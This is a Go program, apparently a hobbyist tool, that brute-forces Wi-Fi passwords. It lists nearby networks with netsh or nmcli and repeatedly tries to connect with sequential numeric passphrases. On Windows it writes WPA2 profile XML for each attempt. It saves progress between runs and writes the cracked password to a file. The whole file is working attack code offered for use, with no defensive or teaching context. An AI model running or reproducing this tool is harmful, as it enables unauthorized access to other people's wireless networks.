package main

import (
	"io/ioutil"
	"strconv"
	"runtime"
	"os/exec"
	"strings"
	"regexp"
	"time"
	"fmt"
	"os"
)

func find(text,searching string) (bool,[]string) {
	m := regexp.MustCompile(searching).FindStringSubmatch(text)
	return len(m) >= 1, m
}

func getWifi() (bool,string) {
	output,_ := exec.Command("netsh", "WLAN", "show", "interfaces").Output()
	if f,_ := find(string(output),`State\s+\:\s+(\S+)`); f {
		if f,auth := find(string(output),`Authentication\s+\:\s+(\S+)`); f && auth[1] != "Unknown" {
			if f,wifi := find(string(output),`SSID\s+\:\s+(\S+)`); f {
				return true,wifi[1]
			}
		}
	}
	return false,""	
}

func main() {
	var wifi string
	var menu string

	if _,err := os.Stat("temp"); err != nil {
		os.Mkdir("temp/", 0660)
	}

	for {
		fmt.Println("\n\n1.attack wifi\n2.set max range")
		fmt.Scan(&menu)

		switch menu {
		case "1":
			for {
				fmt.Println("\n\n\nselect wifi:")

				wifi_list := []string{}
				if runtime.GOOS == "linux" {
					output,_ := exec.Command("nmcli", "dev", "wifi", "list").Output()
					outputSplit := strings.Split(string(output),"\n")
					for i := 0; i < len(outputSplit); i++ {
						if f,m := find(outputSplit[i],`(\S+)\:(\S+)\:(\S+)\:(\S+)\:(\S+)\:(\S+)\s+(\S+)`); f {
							fmt.Printf("%d.%s \n",i-1,m[7])
							wifi_list = append(wifi_list,m[7])
						}
					} 
				} else if runtime.GOOS == "windows" {
					output,_ := exec.Command("netsh", "wlan", "show", "networks").Output()
					outputSplit := strings.Split(string(output),"\r")
					c := 0
					for i := 0; i < len(outputSplit); i++ {
						if f,m := find(outputSplit[i],`SSID \d+\s+\:\s+(\S+)`); f {
							fmt.Printf("%d.%s \n",c,m[1])
							wifi_list = append(wifi_list,m[1])
							c += 1
						}
					}
				} else {
					fmt.Println("unknown runtime.GOOS")
					for {

					}
				}
				fmt.Scan(&wifi)
				if f,m := find(wifi,`^(\d+)`); f {
					s,_  := strconv.Atoi(m[1])
					if s >= 0 && s <= (len(wifi_list)-1) {
						fmt.Println("\n\n*you select wifi ",wifi_list[s])
						wifi = wifi_list[s]
						break
					}
				}
			}

			fmt.Println(wifi)
			if _,err := os.Stat("temp/"+wifi+".txt"); err != nil { 
				ioutil.WriteFile("temp/"+wifi+".txt", []byte("1"), 0644)
			}

			fc,_ := ioutil.ReadFile("temp/"+wifi+".txt")
			count,_ := strconv.Atoi(string(fc))

			fleght,_ := ioutil.ReadFile("max_leght.txt")
			leght,_ := strconv.Atoi(string(fleght))

			for i := count; i <= leght; i++ {
				pass := fmt.Sprintf("%0"+strconv.Itoa(len(string(fleght)))+"d", i)
				fmt.Printf("[pass]%s\n",pass)
				ioutil.WriteFile("temp/"+wifi+".txt", []byte(strconv.Itoa(i-1)), 0644)

				if runtime.GOOS == "windows" {
					xml := `<?xml version="1.0"?>
		<WLANProfile xmlns="http://www.microsoft.com/networking/WLAN/profile/v1">
		    <name>`+wifi+`</name>
		    <SSIDConfig>
		        <SSID>
		            <name>`+wifi+`</name>
		        </SSID>
		    </SSIDConfig>
		    <connectionType>ESS</connectionType>
		    <connectionMode>auto</connectionMode>
		    <MSM>
		        <security>
		            <authEncryption>
		                <authentication>WPA2PSK</authentication>
		                <encryption>AES</encryption>
		                <useOneX>false</useOneX>
		            </authEncryption>
		            <sharedKey>
		                <keyType>passPhrase</keyType>
		                <protected>false</protected>
		                <keyMaterial>`+pass+`</keyMaterial>
		            </sharedKey>
		        </security>
		    </MSM>
		</WLANProfile>`
					ioutil.WriteFile(wifi+".xml", []byte(xml), 0644)

					exec.Command("netsh", "wlan", "add", "profile", "filename=\""+wifi+".xml\"", "interface=Wi-Fi").Run()
					exec.Command("netsh", "wlan", "connect", "name=\""+wifi+"\"", "ssid=\""+wifi+"\"", "interface=Wi-Fi").Run()

					time.Sleep(250 * time.Millisecond)

					status,connectingWifi := getWifi()
					if status && connectingWifi == wifi {
						fmt.Println("succes connect!")
						ioutil.WriteFile(wifi+"_SUCCESFULL.txt", []byte(pass), 0644)
						return
					}
				} else if runtime.GOOS == "linux" {
					cmd := exec.Command("sudo","nmcli", "dev", "wifi", "connect", wifi, "password", pass)
					output, _ := cmd.CombinedOutput()
					fmt.Println(string(output))
				}

			}
		case "2":
			for {
				fmt.Println("enter max leght(800000000~)")
				var leght string
				fmt.Scan(&leght)
				if f,l := find(leght,`^(\d+)$`); f {
					ioutil.WriteFile("max_leght.txt", []byte(l[1]), 0644)
					break
				}
			}
		default:
			fmt.Println("emm..")
		}
	}

}

//	nmcli dev wifi list  
//	sudo nmcli dev wifi connect <network-ssid> password <network-password>
//	sudo nmcli dev wifi connect TP-Link_20B8 password 12345678


